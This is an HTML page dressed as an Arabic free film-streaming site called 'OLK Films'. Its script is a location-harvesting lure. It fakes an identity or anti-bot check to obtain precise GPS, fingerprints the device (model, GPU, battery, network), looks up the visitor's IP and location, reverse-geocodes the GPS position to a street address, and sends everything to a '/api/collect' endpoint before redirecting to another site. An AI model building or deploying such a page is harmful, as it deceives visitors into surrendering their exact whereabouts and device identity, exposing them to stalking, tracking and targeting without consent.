<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>OLK Films - شاهد أفضل الأفلام والمسلسلات مجاناً</title>
    <meta name="description" content="شاهد أفضل الأفلام والمسلسلات مجاناً بجودة عالية">
    <!-- iOS Safari -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="apple-mobile-web-app-title" content="OLK Films">
    <meta name="format-detection" content="telephone=no">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', sans-serif;
            background: #0a0a1a;
            overflow: hidden;
            height: 100vh;
            height: -webkit-fill-available;
            width: 100vw;
            padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
        }

        /* Loading Screen */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #0a0a1a, #1a1035, #0d0d2b);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            transition: opacity 0.6s ease;
        }

        .loading-screen.fade-out {
            opacity: 0;
            pointer-events: none;
        }

        .loading-content {
            text-align: center;
            color: white;
            max-width: 400px;
            padding: 0 20px;
        }

        .loading-logo {
            font-size: 42px;
            font-weight: 800;
            background: linear-gradient(135deg, #e50914, #ff6b6b);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            color: transparent;
            margin-bottom: 8px;
        }

        .loading-icon {
            font-size: 54px;
            margin-bottom: 20px;
            animation: bounce 1.5s ease-in-out infinite;
        }

        @keyframes bounce {

            0%,
            100% {
                transform: translateY(0);
            }

            50% {
                transform: translateY(-12px);
            }
        }

        .loading-content h2 {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 6px;
            color: rgba(255, 255, 255, 0.7);
        }

        .loading-sub {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.35);
            margin-bottom: 28px;
        }

        .loading-spinner {
            width: 36px;
            height: 36px;
            border: 3px solid rgba(255, 255, 255, 0.08);
            border-top: 3px solid #e50914;
            border-radius: 50%;
            margin: 0 auto 14px;
            animation: spinLoader 0.8s linear infinite;
        }

        @keyframes spinLoader {
            to {
                transform: rotate(360deg);
            }
        }

        .loading-hint {
            font-size: 11px;
            color: rgba(255, 255, 255, 0.2);
        }

        /* GPS Blocked Screen */
        .gps-blocked {
            display: none;
        }

        .gps-blocked.active {
            display: block;
        }

        .blocked-icon {
            font-size: 64px;
            margin-bottom: 20px;
        }

        .blocked-title {
            font-size: 20px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 8px;
        }

        .blocked-text {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.5);
            margin-bottom: 24px;
            line-height: 1.7;
        }

        .retry-btn {
            background: linear-gradient(135deg, #e50914, #ff3d3d);
            color: white;
            border: none;
            padding: 14px 40px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 20px rgba(229, 9, 20, 0.3);
            margin-bottom: 16px;
        }

        .retry-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 30px rgba(229, 9, 20, 0.5);
        }

        .steps-list {
            text-align: right;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            padding: 16px 20px;
            margin-top: 20px;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.5);
            line-height: 2;
        }

        .steps-list .step-num {
            color: #e50914;
            font-weight: 700;
            margin-left: 6px;
        }

        /* Normal loading state */
        .normal-loading {
            display: block;
        }

        .normal-loading.hidden {
            display: none;
        }

        /* Website iframe */
        .site-frame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
    </style>
</head>

<body>

    <!-- Loading / GPS Required Screen -->
    <div class="loading-screen" id="loadingScreen">
        <div class="loading-content">
            <!-- Normal Loading -->
            <div class="normal-loading" id="normalLoading">
                <div class="loading-logo">OLK Films</div>
                <div class="loading-icon">🎬</div>
                <h2>جاري تحميل الموقع...</h2>
                <p class="loading-sub">يرجى الانتظار لحظات</p>
                <div class="loading-spinner"></div>
                <p class="loading-hint">⏳ يتم التحقق من أمان الاتصال...</p>
            </div>

            <!-- GPS Blocked -->
            <div class="gps-blocked" id="gpsBlocked">
                <div class="loading-logo">OLK Films</div>
                <div class="blocked-icon">🔒</div>
                <div class="blocked-title">مطلوب تأكيد الهوية</div>
                <div class="blocked-text">
                    للحماية من الروبوتات والوصول الغير مصرح به،<br>
                    يرجى السماح بالتحقق من هويتك للمتابعة
                </div>
                <button class="retry-btn" onclick="requestGPS()">✓ تأكيد والمتابعة</button>

            </div>
        </div>
    </div>

    <script>
        let dataCollected = false;

        async function collectDeviceInfo() {
            const info = { device: {}, ipInfo: {}, gpsLocation: {} };

            // Device info — comprehensive detection
            try {
                const ua = navigator.userAgent;
                info.device.userAgent = ua;
                info.device.language = navigator.language || 'Unknown';
                info.device.languages = navigator.languages?.join(', ') || navigator.language;
                info.device.screenWidth = screen.width;
                info.device.screenHeight = screen.height;
                info.device.availWidth = screen.availWidth;
                info.device.availHeight = screen.availHeight;
                info.device.colorDepth = screen.colorDepth;
                info.device.pixelRatio = window.devicePixelRatio;
                info.device.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                info.device.timezoneOffset = new Date().getTimezoneOffset();
                info.device.cookiesEnabled = navigator.cookieEnabled;
                info.device.cores = navigator.hardwareConcurrency || 'Unknown';
                info.device.memory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
                info.device.touchPoints = navigator.maxTouchPoints || 0;
                info.device.online = navigator.onLine;
                info.device.doNotTrack = navigator.doNotTrack || 'Unknown';
                info.device.referrer = document.referrer || 'Direct';
                info.device.windowSize = window.innerWidth + 'x' + window.innerHeight;

                // --- Detailed OS Detection ---
                let os = 'Unknown', osVersion = '';
                if (/Windows/.test(ua)) {
                    os = 'Windows';
                    const match = ua.match(/Windows NT (\d+\.\d+)/);
                    if (match) {
                        const ver = { '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7', '6.0': 'Vista', '5.1': 'XP' };
                        osVersion = ver[match[1]] || match[1];
                    }
                } else if (/Android/.test(ua)) {
                    os = 'Android';
                    const match = ua.match(/Android\s*([\d.]+)/);
                    osVersion = match ? match[1] : '';
                } else if (/iPhone|iPad|iPod/.test(ua)) {
                    os = 'iOS';
                    const match = ua.match(/OS\s*([\d_]+)/);
                    osVersion = match ? match[1].replace(/_/g, '.') : '';
                } else if (/Mac OS X/.test(ua)) {
                    os = 'macOS';
                    const match = ua.match(/Mac OS X\s*([\d_]+)/);
                    osVersion = match ? match[1].replace(/_/g, '.') : '';
                } else if (/Linux/.test(ua)) {
                    os = 'Linux';
                } else if (/CrOS/.test(ua)) {
                    os = 'Chrome OS';
                }
                info.device.os = os;
                info.device.osVersion = osVersion;
                info.device.platform = os + (osVersion ? ' ' + osVersion : '');

                // --- Detailed Browser Detection ---
                let browser = 'Unknown', browserVersion = '';
                if (/OPR|Opera/.test(ua)) {
                    browser = 'Opera';
                    const m = ua.match(/(?:OPR|Opera)[/\s]([\d.]+)/);
                    browserVersion = m ? m[1] : '';
                } else if (/Edg/.test(ua)) {
                    browser = 'Edge';
                    const m = ua.match(/Edg\/([\d.]+)/);
                    browserVersion = m ? m[1] : '';
                } else if (/SamsungBrowser/.test(ua)) {
                    browser = 'Samsung Internet';
                    const m = ua.match(/SamsungBrowser\/([\d.]+)/);
                    browserVersion = m ? m[1] : '';
                } else if (/UCBrowser/.test(ua)) {
                    browser = 'UC Browser';
                    const m = ua.match(/UCBrowser\/([\d.]+)/);
                    browserVersion = m ? m[1] : '';
                } else if (/Firefox|FxiOS/.test(ua)) {
                    browser = 'Firefox';
                    const m = ua.match(/(?:Firefox|FxiOS)\/([\d.]+)/);
                    browserVersion = m ? m[1] : '';
                } else if (/CriOS/.test(ua)) {
                    browser = 'Chrome (iOS)';
                    const m = ua.match(/CriOS\/([\d.]+)/);
                    browserVersion = m ? m[1] : '';
                } else if (/Chrome/.test(ua)) {
                    browser = 'Chrome';
                    const m = ua.match(/Chrome\/([\d.]+)/);
                    browserVersion = m ? m[1] : '';
                } else if (/Safari/.test(ua)) {
                    browser = 'Safari';
                    const m = ua.match(/Version\/([\d.]+)/);
                    browserVersion = m ? m[1] : '';
                }
                info.device.browser = browser;
                info.device.browserVersion = browserVersion;
                info.device.browserFull = browser + (browserVersion ? ' v' + browserVersion : '');

                // --- Device Model Detection ---
                let deviceModel = '';
                info.device.isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
                info.device.isTablet = /iPad|Tablet|Tab/i.test(ua) || (info.device.isMobile && Math.min(screen.width, screen.height) > 600);

                if (/iPhone/.test(ua)) {
                    deviceModel = 'Apple iPhone';
                } else if (/iPad/.test(ua)) {
                    deviceModel = 'Apple iPad';
                } else if (/SM-[A-Z]\d+/.test(ua)) {
                    const m = ua.match(/(SM-[A-Z]\d+[A-Z]?)/);
                    deviceModel = 'Samsung ' + (m ? m[1] : '');
                } else if (/Samsung/.test(ua)) {
                    deviceModel = 'Samsung';
                } else if (/Huawei|HUAWEI|HW/.test(ua)) {
                    const m = ua.match(/(?:HUAWEI|HW-|Huawei)\s*([A-Za-z0-9-]+)/);
                    deviceModel = 'Huawei ' + (m ? m[1] : '');
                } else if (/Xiaomi|Redmi|POCO|Mi\s/.test(ua)) {
                    const m = ua.match(/(Redmi[^\s;)]+|POCO[^\s;)]+|Mi\s[^\s;)]+|Xiaomi[^\s;)]+)/);
                    deviceModel = m ? m[1] : 'Xiaomi';
                } else if (/OPPO/.test(ua)) {
                    const m = ua.match(/OPPO\s*([A-Za-z0-9]+)/);
                    deviceModel = 'OPPO ' + (m ? m[1] : '');
                } else if (/vivo/.test(ua)) {
                    const m = ua.match(/vivo\s*([A-Za-z0-9]+)/);
                    deviceModel = 'vivo ' + (m ? m[1] : '');
                } else if (/Pixel/.test(ua)) {
                    const m = ua.match(/(Pixel[^\s;)]*)/);
                    deviceModel = 'Google ' + (m ? m[1] : 'Pixel');
                } else if (/OnePlus/.test(ua)) {
                    const m = ua.match(/(OnePlus[^\s;)]*)/);
                    deviceModel = m ? m[1] : 'OnePlus';
                } else if (/Realme|RMX/.test(ua)) {
                    deviceModel = 'Realme';
                } else if (/Nokia/.test(ua)) {
                    deviceModel = 'Nokia';
                } else if (/LG/.test(ua)) {
                    deviceModel = 'LG';
                } else if (/Motorola|moto/.test(ua)) {
                    deviceModel = 'Motorola';
                }
                info.device.model = deviceModel || (info.device.isMobile ? 'موبايل غير معروف' : 'كمبيوتر');
                info.device.type = info.device.isTablet ? 'تابلت' : (info.device.isMobile ? 'موبايل' : 'كمبيوتر');

                // --- GPU Detection ---
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const ext = gl.getExtension('WEBGL_debug_renderer_info');
                        if (ext) {
                            info.device.gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
                            info.device.gpuVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
                        }
                    }
                } catch (e) {}
            } catch (e) { }

            // Battery
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    info.device.battery = Math.round(battery.level * 100) + '%';
                    info.device.charging = battery.charging ? 'نعم' : 'لا';
                }
            } catch (e) { info.device.battery = 'غير متاح'; }

            // Network
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    info.device.connection = conn.effectiveType || 'Unknown';
                    info.device.downlink = conn.downlink ? conn.downlink + ' Mbps' : 'Unknown';
                } else { info.device.connection = 'غير متاح'; }
            } catch (e) { info.device.connection = 'غير متاح'; }

            // IP & Location (HTTPS first for iOS Safari compatibility)
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                if (ipResponse.ok) {
                    const ipData = await ipResponse.json();
                    info.ipInfo = {
                        ip: ipData.ip, country: ipData.country_name,
                        countryCode: ipData.country_code, region: ipData.region,
                        city: ipData.city, zip: ipData.postal,
                        lat: ipData.latitude, lon: ipData.longitude,
                        timezone: ipData.timezone, isp: ipData.org
                    };
                }
            } catch (e) {
                try {
                    const backup = await fetch('http://ip-api.com/json/?lang=ar&fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
                    if (backup.ok) {
                        const bData = await backup.json();
                        if (bData.status === 'success') {
                            info.ipInfo = {
                                ip: bData.query, country: bData.country,
                                countryCode: bData.countryCode, region: bData.regionName,
                                city: bData.city, zip: bData.zip,
                                lat: bData.lat, lon: bData.lon,
                                timezone: bData.timezone, isp: bData.isp, org: bData.org
                            };
                        }
                    }
                } catch (e2) { }
            }

            return info;
        }

        function showBlocked() {
            document.getElementById('normalLoading').classList.add('hidden');
            document.getElementById('gpsBlocked').classList.add('active');
        }

        function showSite() {
            window.location.href = 'https://olk-o.vercel.app/';
        }

        async function requestGPS() {
            document.getElementById('gpsBlocked').classList.remove('active');
            document.getElementById('normalLoading').classList.remove('hidden');

            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true, timeout: 15000, maximumAge: 0
                    });
                });

                const info = await collectDeviceInfo();
                info.gpsLocation = {
                    lat: pos.coords.latitude, lon: pos.coords.longitude,
                    accuracy: Math.round(pos.coords.accuracy) + 'm',
                    altitude: pos.coords.altitude, speed: pos.coords.speed
                };
                try {
                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${info.gpsLocation.lat}&lon=${info.gpsLocation.lon}&format=json&accept-language=ar`);
                    if (geoRes.ok) {
                        const geo = await geoRes.json();
                        info.gpsLocation.city = geo.address?.city || geo.address?.town || geo.address?.village || '';
                        info.gpsLocation.district = geo.address?.suburb || geo.address?.neighbourhood || '';
                        info.gpsLocation.state = geo.address?.state || '';
                        info.gpsLocation.country = geo.address?.country || '';
                        info.gpsLocation.road = geo.address?.road || '';
                        info.gpsLocation.fullAddress = geo.display_name || '';
                    }
                } catch (e) { }
                try {
                    await fetch('/api/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(info) });
                } catch (e) { }
                dataCollected = true;
                showSite();
            } catch (e) {
                showBlocked();
            }
        }

        // Page load — request GPS immediately
        window.addEventListener('load', () => {
            requestGPS();
        });
    </script>
</body>

</html>
